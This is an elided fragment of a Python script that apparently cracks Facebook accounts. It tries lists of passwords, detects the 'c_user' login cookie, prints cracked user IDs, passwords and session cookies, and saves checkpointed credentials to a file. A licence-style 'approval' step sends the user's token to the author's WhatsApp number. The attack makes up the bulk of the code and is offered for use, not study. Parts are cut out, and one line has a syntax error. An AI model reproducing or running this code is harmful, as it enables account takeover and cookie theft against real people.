...
logo = """
         ...
         \033[1;37m   #  #    #   # #         # ######   #  
         \033[1;37m   #  #       # # #        ##            #  #   
         \033[1;37m ###  ###  #   #### #              # #######\033[1;32m iqbal\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32miqbal\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100090444343400')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[iqbal-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[iqbal-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open(iqbal-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97miqbal\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923057386873?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
